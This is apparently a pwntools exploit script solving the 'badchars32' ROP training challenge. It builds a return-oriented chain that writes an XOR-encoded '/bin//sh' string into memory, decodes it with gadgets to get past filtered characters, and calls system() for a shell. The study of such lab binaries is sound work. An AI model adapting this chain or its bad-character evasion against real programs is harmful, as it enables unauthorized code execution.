from pwn import *

# In case you're wondering how to do this with ropper:

# ropper -b '626963666e7320' --file ./badchars32
# '0x620x690x630x200x660x6e0x73' 
# '0x62 0x69 0x63 0x20 0x66 0x6e 0x73'
# b i c / <space> f n s

def xor(string, key):
  ret = ""
  for i in string:
    ret += str(chr(ord(i) ^ key))
  return ret

data1 = 0x804a045
data2 = 0x804a049

system = 0x080487b7

# Doesn't result in getting chars with b i c / <space> f n s for /bin//sh
key = 0x03
 
def writebinsh(key):
  key = 0x03
  bins = xor("/bin", key);
  sh = xor("//sh", key);
  
  ret = ""  

  ret += p32(0x08048899) # pop esi; pop edi; ret;
  ret += bins
  ret += p32(data1)
  ret += p32(0x08048893) # mov dword ptr [edi], esi; ret;
  ret += p32(0x08048899) # pop esi; pop edi; ret;
  ret += sh
  ret += p32(data2)
  ret += p32(0x08048893) # mov dword ptr [edi], esi; ret;
  return ret

def remote_unxor(string, key, data):
  ret = ""
  for i in range(0,4):
    ret += p32(0x08048896)  # pop ebx; pop ecx; ret;
    ret += p32(data + i)  # this is where our string is located after writebinsh
    ret += p32(key);  
    ret += p32(0x08048890)   # xor byte ptr [ebx], cl; ret;
  return ret

def CallSystem(systemaddr):
  ret = ""
  ret += p32(system)
  ret += p32(data1)
  return ret
  
pad = 'A'*44

ret = ""

ret += writebinsh(key) 
ret += remote_unxor("/bin", key, data1)
ret += remote_unxor("//sh", key, data2)
ret += CallSystem(system)

payload = pad + ret

elf = ELF('badchars32')

io = process(elf.path)
io.recvuntil("> ")
io.sendline(payload)
io.interactive()